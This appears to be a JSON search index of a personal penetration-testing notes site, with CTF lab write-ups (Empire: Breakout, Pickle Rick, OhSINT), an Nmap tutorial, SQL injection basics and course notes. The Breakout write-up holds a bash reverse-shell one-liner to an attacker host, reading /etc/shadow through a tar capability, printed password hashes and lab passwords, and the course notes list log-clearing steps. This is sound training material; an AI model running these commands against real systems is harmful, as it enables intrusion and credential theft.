+    "content": "IP: eth0: 192.168.68.109 . What services are running on the target? nmap -sCV -v -oN tcp 192.168.68.109 . | Scan for service versions &amp; default scripts, with verbose, output to file tcp | . | Port | Service | Version | Description | . | 80/tcp | Apache httpd | 2.4.51 | Apache web server | . | 139/tcp | netbios-ssn samba smbd | 4.6.2 | smbd is the server daemon that provides filesharing and printing services to Windows clients | . | 445/tcp | netbios-ssn samba smbd | 4.6.2 | smbd is the server daemon that provides filesharing and printing services to Windows clients | . | 10000/tcp | MiniServ (Webmin httpd) | 1.981 | Web-based admin system | . | 20000/tcp | MiniServ (Webmin httpd) | 1.830 | Web-based admin system | . Running an smbmap -H 192.168.68.109 checked for all the disks hosted: . [+] IP: 192.168.68.109:10000 Name: 192.168.68.109 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (Samba 4.13.5-Debian) . Running gobuster on the site also identified the /server-status which resulted in a 403 (Forbidden). https://192.168.68.109:10000/ is running a Webmin login . https://192.168.68.109:20000/ is running a Usermin login . Hidden at the bottom of the page-source for the default page is: . ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++. This is written in brain fuck, when run it decrypts a password: .2uqPEfj3D&lt;P'a-3 . Running enum4linux -a 192.168.68.109 which scans for smb information, identified a user: S-1-22-1-1000 Unix User\\cyber (Local User) . Attempting to log into Usermin (port 20000) with: . | Username: cyber | Password: .2uqPEfj3D&lt;P'a-3 | . Results in success . ",
+    "url": "/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#scanning",
+    "relUrl": "/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#scanning"
+  },"30": {
+    "doc": "Empire: Breakout CTF",
+    "title": "Exploitation",
+    "content": "After logging into the user account, noticed there was a command terminal. Ran bash -i &gt;&amp; /dev/tcp/PARROT_IP/4444 0&gt;&amp;1 on the target to open a reverse shell. Then using netcat nc -lvp 4444 on the parrot machine I have connected as cyber. Gaining some information on the target system: cat /proc/version || uname -a . Linux version 5.10.0-9-amd64 (debian-kernel@lists.debian.org) (gcc-10 (Debian 10.2.1-6) 10.2.1 20210110, GNU ld (GNU Binutils for Debian) 2.35.2) #1 SMP Debian 5.10.70-1 (2021-09-30) . lsb_release -a . No LSB modules are available. Distributor ID: Debian Description: Debian GNU/Linux 11 (bullseye) Release: 11 Codename: bullseye . cat /etc/os-release . PRETTY_NAME=\"Debian GNU/Linux 11 (bullseye)\" NAME=\"Debian GNU/Linux\" VERSION_ID=\"11\" VERSION=\"11 (bullseye)\" VERSION_CODENAME=bullseye ID=debian HOME_URL=\"https://www.debian.org/\" SUPPORT_URL=\"https://www.debian.org/support\" BUG_REPORT_URL=\"https://bugs.debian.org/\" . We can see they are running Debian Bullseye version 11. Now we want to gain root access: Privilege escalation. Exploring an interesting article for PE using getcap https://nxnjz.net/2018/08/an-interesting-privilege-escalation-vector-getcap/?source=post_page—–dc3170d7748f——————————– . When we run getcap -r / 2&gt;/dev/null we can see some interesting permissions on the ./tar binary. cap_dac_read_search can be seen on the binary. CAP_DAC_READ_SEARCH Source . | Bypass file read permission checks and directory read and execute permission checks. | . This means we can archive files or directories we don’t have permission to access then extract them to view their contents. Targeting the /etc/shadow file we can get all the password hashes for the different accounts on the system. tar -cvf shadow.tar /etc/shadow to archive the dir tar -xvf shadow.tar to extract it . $ cat shadow root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$Wyz40CNLlZCFN6Xltv9AAZAJY5S3aDvLXp0tmJKlk6A:18919:0:9 ... cyber:$y$j9T$x6sDj5S/H0RH4IGhi0c6x0$mIPyCIactTA3/gxTaI7zctfCt2.EOGXTOW4X9efAVW4:18919:0: . Above would have forced me to crack the hash, so we check the /var/backups/.old_pass.bak using the same method, and we find an old password: Ts&amp;4&amp;YurgtRX(=~h . cat /root/rOOt.txt reveals the final flag: 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation} . ",
+    "url": "/pen-test-docs/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#exploitation",
+    "relUrl": "/Practice-Labs/vulnhub/Empire%20-%20Breakout.html#exploitation"
+  },"31": {
+    "doc": "Introduction",
+    "title": "Introduction",
+    "content": ". | SQL Injection (SQLi) | Database Management Systems (DBMS) . | Types of Databases . | Relational Databases | . | Non-relational Databases | . | . User-supplied information can be used to construct database queries. User &lt;–&gt; Tier 1 (Front-end Website) &lt;–&gt; Tier 2 (Application Server) &lt;–&gt; DataBase Management System . An SQL injection refers to an attack on a Relational database such as MySQL (whereas injections against non-relational databases, such as MongoDB, are NoSQL injections) . SQL Injection (SQLi) . First thing that needs to be done is inject SWL code outside the expected user input limits, so it’s not executed as user input. The most basic case this can be done by inserting (' or \") to escape the limits of user input. Next you need to find a way to execute a different SQL query. This can be done by adding an extra query to the end of the generated one using stacked queries or using Union queries. Finally we then need to interpret it or capture it on the web application’s front end. ",
+    "url": "/pen-test-docs/Attacks/sql-injection/Introduction.html",
+    "relUrl": "/Attacks/sql-injection/Introduction.html"
+  },"32": {
+    "doc": "Introduction",
+    "title": "Database Management Systems (DBMS)",
+    "content": "A DBMS helps create, define, host and manage databases. Various types exist such as file-based, Relational DBMS (RDBMS), NoSQL, Graph based, and Key/Value stores. DBMS’s can be interacted with multiple ways, such as CLI’s GUI’s or API’s. Key features of a DBMS include: . | Feature | Description | . | Concurrency | Be able to handle multiple users interacting with the database simultaneously without corrupting or losing any data | . | Consistency | With multiple users the data base needs to remain consistent and valid | . | Security | Need permission and user authentication controls to prevent unauthorized viewing or editing of data | . | Reliability | Easy to backup and roll back to a previous state in case of data loss or breach | . | Structured Query Language | SQL simplifies user interaction with the database with an intuitive syntax supporting various operations | . A two-tiered architecture Tier I usually consists of client-side applications such as websites or GUI programs. High-level interactions that pass data to Tier II through API calls or other requests. Tier II is middleware, which interprets these events and puts them in a form required by the DBMS. Application Layer uses specific libraries and drivers based on the type of DBMS to interact with them. Processes requests from the second tier. Returns any requested data or error codes. Note: It is possible to host the application server as well as the DBMS in the same host but databases with large amounts of data supporting many users are typically hosted seperately for performance and scalability . Types of Databases . Databases fall into 2 catagories in general, Relational Databases and Non-Relational Databases. Only Relation databases utilize SQL, while Non-Relation databases utilize a variety of methods for communicating. Relational Databases . A relational database uses a schema, a template, to dictate the data structure stored in the database. Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when needed. These tables, also called entities, are related to each other. To link multiple tables using a key you need a relational database management system (RDBMS). The relationship between tables within a database is called a schema. Non-relational Databases . | Don’t use rows, columns, tables or prime keys, relationships or schemas. | Also called a NoSQL database. | Instead it uses, various storage models, depending on the type of data stored. | Very scalable and felixable due to their lack of defined structure. | . 4 Common storage models for NoSQL: . | Key-Value | Document-Based | Wide-Column | Graph | . Most common example of a NoSQL database is MongoDB . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/Introduction.html#database-management-systems-dbms",
+    "relUrl": "/Attacks/sql-injection/Introduction.html#database-management-systems-dbms"
+  },"33": {
+    "doc": "Knowledge",
+    "title": "Knowledge",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Knowledge%20Index.html",
+    "relUrl": "/Knowledge/Knowledge%20Index.html"
+  },"34": {
+    "doc": "CLI Logging",
+    "title": "CLI Logging",
+    "content": ". Logging is essential for both documentation and our protection. If third parties attack the company during our penetration test and damage occurs, we can prove that the damage did not result from our activities. For this, we can use the tools script and date. Date can be used to display the exact date and time of each command in our command line. With the help of script, every command and the subsequent result is saved in a background file. To display the date and time, we can replace the PS1 variable in our .bashrc file with the following content. PS1=\"\\[\\033[1;32m\\]\\342\\224\\200\\$([[ \\$(/opt/vpnbash.sh) == *\\\"10.\\\"* ]] &amp;&amp; echo \\\"[\\[\\033[1;34m\\]\\$(/opt/vpnserver.sh)\\[\\033[1;32m\\]]\\342\\224\\200[\\[\\033[1;37m\\]\\$(/opt/vpnbash.sh)\\[\\033[1;32m\\]]\\342\\224\\200\\\")[\\[\\033[1;37m\\]\\u\\[\\033[01;32m\\]@\\[\\033[01;34m\\]\\h\\[\\033[1;32m\\]]\\342\\224\\200[\\[\\033[1;37m\\]\\w\\[\\033[1;32m\\]]\\n\\[\\033[1;32m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 [\\[\\e[01;33m\\]$(date +%D-%r)\\[\\e[01;32m\\]]\\\\$ \\[\\e[0m\\]\" . ZSH version . PROMPT='%B┌──(%F{blue}%n@%m%F{reset})─[%F{#FFFFFF}%~%F{reset}] %B└─%F{red}$%F{#FFFFFF} ' RPROMPT='[%D{\\%d/%m/%Y} %*]' . This can also be achieved similarly with Oh-My-ZSH by adding the following in the .zshrc file. autoload -Uz vcs_info precmd() { # Sets the tab title to current dir echo -ne \"\\e]1;${PWD##*/}\\a\" vcs_info } zstyle ':vcs_info:git:*' formats '%b' setopt PROMPT_SUBST # Configure PROMPT &amp; RPROMPT PROMPT='%B┌──[%F{#FFFFFF}%*%F{reset}]─[%F{#FFFFFF}%~%F{reset}] %B└─[%F{magenta}${vcs_info_msg_0_}%F{reset}]─%F{red}$%F{#FFFFFF} ' TMOUT=1 TRAPALRM() { zle reset-prompt } . On Linux ‘script’ can be used: . $ script 03-21-2021-0200pm-exploitation.log $ exit . On Windows ‘Start-Transcript’ can be used to log everything run . C:\\&gt; Start-Transcript -Path \"C:\\Pentesting\\03-21-2021-0200pm-exploitation.log\" Transcript started, output file is C:\\Pentesting\\03-21-2021-0200pm-exploitation.log C:\\&gt; Stop-Transcript . Recommended to define the name of the log in advance eg. &lt;date&gt;-&lt;start time&gt;-&lt;name&gt;.log . ",
+    "url": "/pen-test-docs/setting-up/Logging.html",
+    "relUrl": "/setting-up/Logging.html"
+  },"35": {
+    "doc": "Networks",
+    "title": "Networks",
+    "content": " ",
+    "url": "/pen-test-docs/Knowledge/Networks/Networks%20Index.html",
+    "relUrl": "/Knowledge/Networks/Networks%20Index.html"
+  },"36": {
+    "doc": "Nmap",
+    "title": "Nmap",
+    "content": ". | The Scanning Phase | What is Nmap? | Why use Nmap? | Planning Before Scanning . | An Example | . | Ports | Using Nmap . | Ping Sweeping | TCP Connect Scan | TCP SYN Scan (Stealthy alternative) | . | Scripting with Nmap NSE . | Creating Scripts in Lua . | The HEAD | The RULES | The ACTION | Hello World Script Example | . | . | . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html",
+    "relUrl": "/Knowledge/Tools/Nmap.html"
+  },"37": {
+    "doc": "Nmap",
+    "title": "The Scanning Phase",
+    "content": "A security test follows the Hacking Process: . | Reconnaissance | Scanning | Enumeration | System Hacking | Escalation of Privilege | Planting Backdoors | Covering Tracks | . The scanning phase in a security test is to gain insights into the technical system data of systems on the network. Tools are used to scan for different technical network and system information. Dialers, Sweepers, Vulnerability scanners, and port scanners are all used in this phase. ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#the-scanning-phase",
+    "relUrl": "/Knowledge/Tools/Nmap.html#the-scanning-phase"
+  },"38": {
+    "doc": "Nmap",
+    "title": "What is Nmap?",
+    "content": "Nmap, Network Mapper, is a port scanner/network mapping tool. It is the most used scanning tool in the industry. It is an open-source linux based cli tool. The tool is designed to scan systems/networks for IP addresses, system ports, OS details, and applications/services installed. ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#what-is-nmap",
+    "relUrl": "/Knowledge/Tools/Nmap.html#what-is-nmap"
+  },"39": {
+    "doc": "Nmap",
+    "title": "Why use Nmap?",
+    "content": "It has the ability to perform highly sophisticated mapping functions that aim to go undetected by IDS/IPS, it can also perform simple network commands. The Nmap Scripting Engine (NSE) provides comprehensive scripting capabilities. Some key benefits of Nmap are: . | Ability to identify specific services running on a system: DNS, web, email, SSH, etc. | Ability to gather OS-specific details of target system. | The Zenmap’s GUI helps build visualisations of the scan results of target networks/systems | Ability to identify and distinguish between different network devices: routers, servers, switches, mobile devices, etc. | The NSE. It allows for complex automation of Nmap’s power. The NSE uses Lua for scripting. | Reusable attack scripts from the NSE repository. | . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#why-use-nmap",
+    "relUrl": "/Knowledge/Tools/Nmap.html#why-use-nmap"
+  },"40": {
+    "doc": "Nmap",
+    "title": "Planning Before Scanning",
+    "content": "The activity of scanning can also be called Foot-printing. Before any port scanning can be conducted it is important to have a plan and objective. Foot-printing will help identify: . | Specific services used by the organisation | Possible application versions | Utilisation frequency by daytime | And more | . This information may help determine the target application, service, host. and/or port to locate on the network. The first step before doing any detailed scans is to map the network. This will give you a list of all ‘up’ or active hosts on the network. Port scanning on these hosts can then be conducted. By correlating the information collected during foot-printing, specific scan types may be executed to find the available ports on a system. An Example . The Example: . | It is discovered that a target organisation is using MS SharePoint 2003, a product that reached EoL in 2014. | Since its EoL two vulnerabilities have been reported in that version. When conducting scans a public-facing SharePoint webpage was located with listening (open) port 8080. | . Example Review: . | After discovery of this potential weakness, the objective was to locate any servers running SharePoint 2003. | Nmap scans identified public-facing open ports. | Recommendations to either upgrade or remove the SharePoint 2003 servers. | . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#planning-before-scanning",
+    "relUrl": "/Knowledge/Tools/Nmap.html#planning-before-scanning"
+  },"41": {
+    "doc": "Nmap",
+    "title": "Ports",
+    "content": "Ports are between 0-65,535. | Ports 0 - 1023 (aka Well-Known Ports): Assigned to universal TCP/IP application protocols. Most common examples: HTTPS, SSH, FTP, DNS, etc. They are registered to these protocols by a global authority. | Ports 1024 - 49,151 (aka Registered Ports): Reserved for application protocols that are not specified as universal. | Ports 49,152 - 65,535 (aka Private/Dynamic Ports): These ports may be used for any process without registering the port with the global assigning authority. | . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#ports",
+    "relUrl": "/Knowledge/Tools/Nmap.html#ports"
+  },"42": {
+    "doc": "Nmap",
+    "title": "Using Nmap",
+    "content": "A basic scan uses the following format: . nmap {Scan Type(s)} {options} [target] . Nmap can take targets as IPv4/IPv6/URLs/Fully Qualified Domain Name (FQDN). Ping Sweeping . nmap -sn [target range] . A ping sweep can be used to scan a network for available hosts, it does this by iterating through a range of addresses sending an Internet Control Message Protocol (ICMP) packet. It is a discovery scan. &lt;summary&gt;Example Ping Sweep&lt;/summary&gt; . $ nmap -sn 192.168.1.1-254 Starting Nmap 7.70 ( https://nmap.org ) at 2022-06-01 13:01 EST Nmap scan report for 192.168.1.96 Host is up (0.064s latency). Nmap scan report for 192.168.1.118 Host is up (0.029s latency). Nmap scan report for 192.168.1.128 Host is up (1.18s latency). Nmap scan report for 192.168.1.171 Host is up (0.0094s latency). Nmap scan report for 192.168.1.179 Host is up (0.064s latency). Nmap scan report for 192.168.1.210 Host is up (0.0066 latency). Nmap scan report for 192.168.1.253 Host is up (0.0049 latency). Nmap done: 254 IP addresses (7 hosts up) scanned in 7.90 seconds . TCP Connect Scan . nmap -sT [target] . TCP establishes a 3-way handshake. Nmap uses this handshake to determine if a port is open: . | Nmap |   | Server | . | SYN (request port 22 connection) | –&gt; |   | . |   | &lt;– | SYN/ACK (Port is open, Go ahead!) | . | ACK (Connection Established) | –&gt; |   | . |   | &lt;– | Data: SSH banner message | . | RST (Kill Connection) | –&gt; |   | . TCP SYN Scan (Stealthy alternative) . nmap -sS [target] . This scan type only performs a partial 3-way handshake, unlike the TCP Connect Scan. It does this by never sending the final ACK packet upon receipt of the SYN/ACK response from the server. | Nmap |   | Server | . | SYN (request port 22 connection) | –&gt; |   | . |   | &lt;– | SYN/ACK (Port is open, Go ahead!) | . | RST (Kill Connection) | –&gt; |   | . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#using-nmap",
+    "relUrl": "/Knowledge/Tools/Nmap.html#using-nmap"
+  },"43": {
+    "doc": "Nmap",
+    "title": "Scripting with Nmap NSE",
+    "content": "Nmap Scripting Engine (NSE) is an important feature of Nmap as it allows for complex automation of various networking tasks. These could range from finding vulnerabilities in networks, identifying possible backdoors, or exploiting a vulnerability in a target system. Nmap uses Lua as its scripting language as it has been embedded into the engine. Some benefits to scripting with Nmap: . | More flexibility and efficiency with network discovery and security audits | Can be more proactive rather than reactive when dealing with system vulnerabilities | Cover more ground with less effort | . For example, a script could be created to take action if a network vulnerabilities is found within a system. The Nmap help page gives us some basics for SCRIPT SCANning. We can: . | Provide script file(s) | Provide arguments to scripts | Provide NSE script arguments in a file | Show all data sent and recieved | Update a script database | Get help with scripting | . SCRIPT SCAN:   -sC: equivalent to --script=default   --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of            directories, script-files or script-categories   --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts   --script-args-file=filename: provide NSE script args in a file   --script-trace: Show all data sent and received   --script-updatedb: Update the script database.   --script-help=&lt;Lua scripts&gt;: Show help about scripts.            &lt;Lua scripts&gt; is a comma-separated list of script-files or            script-categories. More detail can be found on the Nmap Scripting Engine website. The -sC flag specifies that for every service discovered, run the default script. This could be useful in finding out additional information about a service eg. It could discover HTTP headers, email information from a page etc . Creating Scripts in Lua . The anatomy of an NSE Script: . -- HEAD -- RULES -- ACTION . The HEAD . The HEAD section of the script contains meta information about your script . | require statements specify dependencies | . local package1 = require \"package1\" local package2 = require \"package2\" . | description is a variable that describes what the script does | . description = [[ Detailed description here! ]] . | author, license, and categories variables | . author = \"Your Name\" license = \"Same as Nmap -- See https://nmap.org/book/man-legal.html\" categories = {\"default\", \"safe\"} . We can see some common categories on the Nmap website. By adding the category \"default\", this script would run when we use the -sC or -A configuration options. We’ll also say this script is \"safe\" because we aren’t planning to crash or hurt anything with our script! . The RULES . The RULES of the script is the portion of the code that determins if the script will run or not. For example, if port 80 isn’t open, maybe we can’t run out HTTP-specific script. In that case, we should terminate the script. The script will always include one of: . | prerule() - This rule runs during the pre-scanning phase, before any hosts have been scanned. Useful for discovery scripts. | hostrule(host) - This rule runs after each batch of hosts have been scanned. | portrule(host, port) - This rule runs after each batch of ports have been scanned. | postrule() - This rule is checked after the scan has completed. Useful for any scripts reviewing the full results of a scan. | . The ACTION . This is where the actual functionality of the script is defined. If the RULE passes, then this section will be executed. Hello World Script Example . -- HEAD local nmap = require \"nmap\" description = [[ \"Hello world script\" ]] author = \"alipali737\" license = \"Same as Nmap--See https://nmap.org/book/man-legal.html\" categories = {\"safe\"} -- RULES portrule = function(host, port) local port_to_check = { number = 4000, protocol = \"tcp\" } local port_state = nmap.get_port_state(host, port_to_check) return port_state ~= nil and port_state.state == \"open\" end -- ACTION action = function(host, port) return \"Hello, port \"..port.number..\"!\" end . ",
+    "url": "/pen-test-docs/Knowledge/Tools/Nmap.html#scripting-with-nmap-nse",
+    "relUrl": "/Knowledge/Tools/Nmap.html#scripting-with-nmap-nse"
+  },"44": {
+    "doc": "OSINT Framework",
+    "title": "OSINT Framework",
+    "content": ". | Manual OSINT . | Google Account IDs | . | Automated Toolings . | Maltego | . | . ",
+    "url": "/pen-test-docs/Attacks/osint/OSINT%20Framework.html",
+    "relUrl": "/Attacks/osint/OSINT%20Framework.html"
+  },"45": {
+    "doc": "OSINT Framework",
+    "title": "Manual OSINT",
+    "content": "The OSINT Framework website provides links of many services that collect data about individuals from open-sources. Analysing this information and particularly what platform they have accounts on can give insight into their hobbies and/or background. Google Account IDs . Google stores a unique ID for each account that can be linked to any action by the user. To find this ID, you can search for an account in google hangouts and then open the developer tools to find the ID. You can then query the google archives with this ID eg: % highlight % https://get.google.com/albumarchive/{google-id} % endhighlight % . ",
+    "url": "/pen-test-docs/Attacks/osint/OSINT%20Framework.html#manual-osint",
+    "relUrl": "/Attacks/osint/OSINT%20Framework.html#manual-osint"
+  },"46": {
+    "doc": "OSINT Framework",
+    "title": "Automated Toolings",
+    "content": "Maltego . Maltego allows you to automate this search for information, the Community Edition has some limitations though. ",
+    "url": "/pen-test-docs/Attacks/osint/OSINT%20Framework.html#automated-toolings",
+    "relUrl": "/Attacks/osint/OSINT%20Framework.html#automated-toolings"
+  },"47": {
+    "doc": "Open-source Intelligence",
+    "title": "Open-source Intelligence",
+    "content": " ",
+    "url": "/pen-test-docs/Attacks/osint/OSINT%20Index.html",
+    "relUrl": "/Attacks/osint/OSINT%20Index.html"
+  },"48": {
+    "doc": "OhSINT CTF",
+    "title": "OhSINT CTF",
+    "content": ". Lab link: https://tryhackme.com/room/ohsint# Difficulty: Easy . This lab is all about OSINT. We are only provided with an image: ![[WindowsXP.jpg]] . Running it through exiftool (which organises all the metadata from within the file) it reveals some important information: ![[Image-metadata-exiftools_16_10_2023_15_48_00.png]] The standout details are the GPS cords &amp; the copyright. When we search that name we get a few interesting results… ![[google-search-owoodflint.jpg]] . When we look at the twitter we are granted our first answer. ![[owoodflint-twitter.jpg]] . The 2nd tweet is also interesting, thinking that question 2 is: What is the SSID of the WAP he connected to? . By using wigle.net we can look up the location of that BSSID. Eventually finding it was located in London. Giving us answer 2 &amp; 3 (What is the SSID of the WAP?) which is UnileverWIFI ![[Pasted image 20231016161147.png]] . Q4 &amp; Q5: What is their email? And what website is it available on? are more simple ones, as it is listed on their github project people_finder. Q6 asks where he has gone on holiday to: When we look on his website you can see its New York. They also seem to have accidently revealed their password on this website too, which answers Q7: pennYDr0pper.! . ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/OhSINT%20CTF.html",
+    "relUrl": "/Practice-Labs/tryhackme/OhSINT%20CTF.html"
+  },"49": {
+    "doc": "Penetration Testing Fundamentals Bootcamp",
+    "title": "Penetration Testing Fundamentals Bootcamp",
+    "content": "O’Reilly course that teaches the early fundamentals of Penetration Testing. Course Link . Covering: . | How to maintain your own pentesting lab environment | Which tools, operating systems, and virtualization you need to succeed | Which of the 38 penetration testing certifications you want and how to get it | The five technical phases of penetration testing | How to keep your job and stay out of jail as a tester | What it takes to do the job of an ethical hacker | How to perform a penetration test | How to build foundational skills in penetration testing | . Table of Contents . | Day 1 . | Recon of target website . | Useful Steps and Process for conducting the PenTest | Some useful tools: . | Scope | Recon | Scanning | Exploitation | Maintain access | Covering tracks (for fighting blue team or defences) | Report | . | . | Further videos: . | Questions: | Notes: | . | Careers in Pen Testing (Cyber Defense Analyst) | . | . ",
+    "url": "/pen-test-docs/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html",
+    "relUrl": "/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html"
+  },"50": {
+    "doc": "Penetration Testing Fundamentals Bootcamp",
+    "title": "Day 1",
+    "content": "Recon of target website . Website: blocked on IBM network Goal: Obtain user accounts . Need to build a userlist: . | Can build a userlist from the | . | Installed seclists on Kali to obtain password lists . | First check ifconfig: . | Write down the address of the attacking system (kali) | Write down the addresses of the victim systems | Test they can all communicate (Ping, nmap etc) (win2k8 server doesn’t respond to ping) | . | . | Attk: eth0: 192.168.100.4 netmask 255.255.255.0 | Victim (ub1404): eth0: 192.168.100.5 mask 255.255.255.0 | . Spend time creating ISO image library: . | create templates of these images so you can put together a sample to test against during a pentest before you test against the real target system | . PenTest VM Setup Process: [Find out PTest target system details] | v [Create replica box to test locally on] | v [Test exploits against replica box (what works, what doesn’t, false positives)] | v [Try tests against real target] . Useful Steps and Process for conducting the PenTest . Create an artifact sheet to collect information as you go . Test the website: . | Collect site information | Can use netcraft | Could use Nmap OS detection only nmap --osscan-limit | MAKE SURE TO CONFIRM THE INFORMATION!!! | . OSINT: . | Collect information regarding the asset | eg. indirect via job postings regarding the company? | . Pen Testing is all about testing All of the possible entries not exploiting just a single one . Some useful tools: . Scope . | Contract | . Recon . | Google | Maltego = local GUI (PAID) | Shodan (PAID) | . Scanning . | Nmap | OpenVAS = local GUI (when internal to organisation, for patch management) | . Exploitation . | Metasploit | . Maintain access . | Metasploit | . Covering tracks (for fighting blue team or defences) . | Distractions (DoS) | Disable logging | Clear logs | IMPORTANT: leaves vuln to actual attackers during, make sure to record every action made in PTest | . Report . | Artifacts = Packets / Screenshots | Encrypted PDF | . Further videos: . | Overview to PTesting | Footprinting and Recon | Enumeration | Vulnerability Analysis | . Questions: . | Who is the company? . | Exp Sec | . | What is their website? . | blocked on IBM network | . | What tools do they tell us about? . | Draft job listing mentions: . | Windows Server 2008 | Oracle Glassfish Enterprise Server | Jenkins | ManageEngine Desktop Central Server | ElasticSearch | MySQL | PHPMyAdmin | Wordpress | . | . | Where can we get public login information? . | Company Email Directory page | Emails are often associated with logins | . | How can we mangle that? | . Notes: . | Site in running as a wordpress site | They are starwars geeks | . Careers in Pen Testing (Cyber Defense Analyst) . | 38 pen testing certifications | 229 Cyber Security Certifications | All Security Certifications | Cyber Security Pathways &amp; Job Details | . ",
+    "url": "/pen-test-docs/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html#day-1",
+    "relUrl": "/Courses/Penetration%20Testing%20Fundamentals%20Bootcamp.html#day-1"
+  },"51": {
+    "doc": "Pickle Rick CTF",
+    "title": "Pickle Rick CTF",
+    "content": ". | Recon | Scanning | Exploitation | . link: https://tryhackme.com/room/picklerick . Difficulty: Easy . ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html",
+    "relUrl": "/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html"
+  },"52": {
+    "doc": "Pickle Rick CTF",
+    "title": "Recon",
+    "content": "Have to answer 3 questions: . | What is the first ingredient that Rick needs? | What is the second ingredient in Rick’s potion? | What is the last and final ingredient? | . There is a hint hidden in the source code of the main webpage: Username: R1ckRul3s . ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#recon",
+    "relUrl": "/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#recon"
+  },"53": {
+    "doc": "Pickle Rick CTF",
+    "title": "Scanning",
+    "content": "What services are running on the target? nmap -sCV -v -oN tcp &lt;IP&gt; . | Scan for service versions &amp; default scripts, with verbose, output to file tcp | . | Port | Service | Version | Description | . | 80/tcp | Apache httpd (Ubuntu) | 2.4.18 | Apache web server supporting GET HEAD POST OPTIONS | . | 22/tcp | ssh | OpenSSH 7.2p2 | SSH | . What can we find out about the ssh running? nmap -sV --script=\"ssh*\" -oN ssh-scripts-results &lt;IP&gt; . | Only publickey auth is allowed | . Running gobuster revealed: . /.htpasswd (Status: 403) /.htaccess (Status: 403) /assets (Status: 301) /robots.txt (Status: 200) /server-status (Status: 403) . | The assets directory just shows the images &amp; bootstrap &amp; JQuery js files | The robots.txt contains the string: Wubbalubbadubdub | . Running nikto -h &lt;IP&gt; revealed the existence of a /login.php . ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#scanning",
+    "relUrl": "/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#scanning"
+  },"54": {
+    "doc": "Pickle Rick CTF",
+    "title": "Exploitation",
+    "content": "Navigating to /login.php and entering the credentials we have found: . Username: R1ckRul3s Password: Wubbalubbadubdub . We are entered into a command panel. The command panel seems to use bash. ls in the command panel gives: . Sup3rS3cretPickl3Ingred.txt assets clue.txt denied.php index.html login.php portal.php robots.txt . navigating to those files reveals the first ingredient. Realising we can navigate up with ls we now have access to freely explore the file system. Running uname -a give us some system details: Linux ip-10-10-224-157 4.4.0-1072-aws #82-Ubuntu SMP Fri Nov 2 15:00:21 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux . Searching in the /home/rick dir we find the second ingredient in a file that can be dumped with the less as cat is disabled. cd ../../../; ls -al; pwd . less /etc/*-release . DISTRIB_ID=Ubuntu DISTRIB_RELEASE=16.04 DISTRIB_CODENAME=xenial DISTRIB_DESCRIPTION=\"Ubuntu 16.04.5 LTS\" NAME=\"Ubuntu\" VERSION=\"16.04.5 LTS (Xenial Xerus)\" ID=ubuntu ID_LIKE=debian PRETTY_NAME=\"Ubuntu 16.04.5 LTS\" VERSION_ID=\"16.04\" HOME_URL=\"http://www.ubuntu.com/\" SUPPORT_URL=\"http://help.ubuntu.com/\" BUG_REPORT_URL=\"http://bugs.launchpad.net/ubuntu/\" VERSION_CODENAME=xenial UBUNTU_CODENAME=xenial . Useful command to search for all files in home dir: ls -alhR /home . doing a sudo -l its revealed we can run any command without the requirement of a password: . Matching Defaults entries for www-data on ip-10-10-224-157.eu-west-1.compute.internal: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on ip-10-10-224-157.eu-west-1.compute.internal: (ALL) NOPASSWD: ALL . running an sudo ls -alhR /root reveals the final key in /root/3rd.txt . ",
+    "url": "/pen-test-docs/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#exploitation",
+    "relUrl": "/Practice-Labs/tryhackme/Pickle%20Rick%20CTF.html#exploitation"
+  },"55": {
+    "doc": "SQL Injection Cheatsheet",
+    "title": "SQL Injection Cheatsheet",
+    "content": ". | Detecting SQL Injection Vulnerabilities | SQL Injection in Different Parts of the Query | SQL Injection Type Examples | Basic SQL Statement | Handling Different SQL System Syntax | Basic Evaluate True (Return All) | Determining the number of columns in a table | UNION Attacks . | Append a blank table to the end of the list with NULL values | Finding columns that have a useful data type | Retrieving information from another table | Retrieving multiple values within a single column | . | Error Based Extraction . | Oracle Based: | . | Discovering System Information | Blind SQL Injection Vulnerabilities | Second-order SQL Injection | . ",
+    "url": "/pen-test-docs/Attacks/sql-injection/SQL%20Injection%20Cheatsheet.html",
